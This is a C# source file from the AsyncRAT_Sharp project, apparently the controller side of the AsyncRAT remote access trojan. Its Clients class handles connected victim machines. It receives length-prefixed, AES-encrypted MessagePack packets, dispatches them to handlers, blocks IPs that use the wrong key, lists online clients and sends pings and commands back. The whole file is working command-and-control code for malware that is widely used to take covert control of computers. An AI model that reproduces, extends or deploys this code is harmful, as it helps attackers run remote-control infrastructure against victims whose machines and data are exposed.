using System;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.Handle_Packet;
using System.Security.Cryptography;
using System.Drawing;
using System.Diagnostics;
using System.Threading;
using AsyncRAT_Sharp.MessagePack;

namespace AsyncRAT_Sharp.Sockets
{
   public class Clients
    {
        public Socket ClientSocket { get; set; }
        public ListViewItem LV { get; set; }
        public ListViewItem LV2 { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private int ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public object SendSync { get; } = new object();
        private object EndSendSync { get; } = new object();
        public long BytesRecevied { get; set; }

        public Clients(Socket socket)
        {
            ClientSocket = socket;
            ClientBuffer = new byte[4];
            ClientMS = new MemoryStream();
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = ClientSocket.EndReceive(ar);
                    if (Recevied > 0)
                    {
                        if (!ClientBufferRecevied)
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
                            ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                            ClientMS.Dispose();
                            ClientMS = new MemoryStream();
                            if (ClientBuffersize > 0)
                            {
                                ClientBuffer = new byte[ClientBuffersize];
                                Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
                                ClientBufferRecevied = true;
                            }
                        }
                        else
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                            Settings.Received += Recevied;
                            BytesRecevied += Recevied;
                            if (ClientMS.Length == ClientBuffersize)
                            {
                                try
                                {
                                    ThreadPool.QueueUserWorkItem(Packet.Read, new object[] { Settings.AES.Decrypt(ClientMS.ToArray()), this });
                                }
                                catch (CryptographicException)
                                {
                                   new HandleLogs().Addmsg($"Client {ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password, IP blocked", Color.Red);
                                    Settings.Blocked.Add(ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
                                    Disconnected();
                                    return;
                                }
                                ClientBuffer = new byte[4];
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBufferRecevied = false;
                            }
                            else
                                ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                        }
                        ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {

            try
            {
                if (LV != null)
                {
                    if (Program.form1.listView1.InvokeRequired)
                        Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                        {
                            LV.Remove();
                        }));
                    lock (Settings.Online)
                        Settings.Online.Remove(this);
                }
            }
            catch { }

            try
            {
                ClientMS?.Dispose();
                ClientSocket?.Dispose();
            }
            catch { }
        }

        public void BeginSend(object Msgs)
        {
            lock (SendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    byte[] buffer = Settings.AES.Encrypt((byte[])Msgs);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                }
                catch
                {
                    Disconnected();
                    return;
                }

            }
        }

        private void EndSend(IAsyncResult ar)
        {
            lock (EndSendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    int sent = 0;
                    sent = ClientSocket.EndSend(ar);
                    Debug.WriteLine("/// Server Sent " + sent.ToString() + " Bytes  ///");
                    Settings.Sent += sent;
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }

        public void Ping(object obj)
        {
            lock (SendSync)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "Ping";
                    msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                    byte[] buffer = Settings.AES.Encrypt(msgpack.Encode2Bytes());
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSocket.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
                    ClientSocket.Send(buffer, 0, buffer.Length, SocketFlags.None);
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }

        }
    }
}
